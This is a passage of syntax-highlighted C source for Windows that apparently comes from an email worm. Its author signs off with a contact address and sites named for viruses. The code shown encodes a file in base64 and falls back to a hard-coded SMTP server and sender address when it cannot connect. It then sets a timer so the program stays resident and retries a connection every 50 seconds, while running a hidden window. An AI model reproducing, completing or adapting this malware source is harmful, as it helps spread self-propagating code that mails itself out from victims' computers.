</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">first</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">base64</span><span class="sc10">(</span><span class="sc11">filename</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//Write a "base64" encoded file every time (just in case)
</span><span class="sc0">    </span><span class="sc11">conect</span><span class="sc10">();</span><span class="sc0"> </span><span class="sc2">//Try to connect
</span><span class="sc0">    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">err</span><span class="sc10">!=</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//If the server found in the reg. got an error, try using the hard-coded serv.
</span><span class="sc0">        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">server</span><span class="sc10">,</span><span class="sc6">"smtp.barrysworld.com"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">email</span><span class="sc10">,</span><span class="sc6">"john@barrysworld.com"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">strcpy</span><span class="sc10">(</span><span class="sc11">helo</span><span class="sc10">,</span><span class="sc6">"barrysworld.com"</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">conect</span><span class="sc10">();</span><span class="sc0">
        </span><span class="sc10">}</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc11">connected</span><span class="sc10">==</span><span class="sc4">0</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">SetTimer</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">tim</span><span class="sc10">,</span><span class="sc4">50000</span><span class="sc10">,</span><span class="sc11">TimerProc</span><span class="sc10">);</span><span class="sc0"> </span><span class="sc2">//Go resident and check for a connection every 50 secs.
</span><span class="sc0">
</span><span class="sc5">while</span><span class="sc10">(</span><span class="sc11">GetMessage</span><span class="sc10">(&amp;</span><span class="sc11">msg</span><span class="sc10">,</span><span class="sc5">NULL</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">,</span><span class="sc4">0</span><span class="sc10">))</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0"> </span><span class="sc2">//Stuff... ;-)
</span><span class="sc0">    </span><span class="sc11">TranslateMessage</span><span class="sc10">(&amp;</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc11">DispatchMessage</span><span class="sc10">(&amp;</span><span class="sc11">msg</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">msg</span><span class="sc10">.</span><span class="sc11">wParam</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc2">//end of main()
</span><span class="sc10">}</span><span class="sc0">

</span><span class="sc2">//--------------------------------------WNDPROC----------------------------------------------
</span><span class="sc0">
</span><span class="sc11">LRESULT</span><span class="sc0"> </span><span class="sc11">CALLBACK</span><span class="sc0"> </span><span class="sc11">WndProc</span><span class="sc10">(</span><span class="sc11">HWND</span><span class="sc0"> </span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">UINT</span><span class="sc0"> </span><span class="sc11">iMsg</span><span class="sc10">,</span><span class="sc11">WPARAM</span><span class="sc0"> </span><span class="sc11">wParam</span><span class="sc10">,</span><span class="sc11">LPARAM</span><span class="sc0"> </span><span class="sc11">lParam</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">HDC</span><span class="sc0"> </span><span class="sc11">hdc</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">PAINTSTRUCT</span><span class="sc0"> </span><span class="sc11">ps</span><span class="sc10">;</span><span class="sc0">

    </span><span class="sc5">switch</span><span class="sc10">(</span><span class="sc11">iMsg</span><span class="sc10">){</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_PAINT</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">hdc</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">BeginPaint</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,&amp;</span><span class="sc11">ps</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc11">EndPaint</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,&amp;</span><span class="sc11">ps</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">case</span><span class="sc0"> </span><span class="sc11">WM_DESTROY</span><span class="sc10">:</span><span class="sc0">
        </span><span class="sc11">PostQuitMessage</span><span class="sc10">(</span><span class="sc4">0</span><span class="sc10">);</span><span class="sc0">
        </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc11">DefWindowProc</span><span class="sc10">(</span><span class="sc11">hwnd</span><span class="sc10">,</span><span class="sc11">iMsg</span><span class="sc10">,</span><span class="sc11">wParam</span><span class="sc10">,</span><span class="sc11">lParam</span><span class="sc10">);</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">
</span><span class="sc2">//That's all folks! e-mail to: MI_pirat@yahoo.com , web: www.virus.isfunny.com || www.red-cell.tk
</span></div></body>
</html>
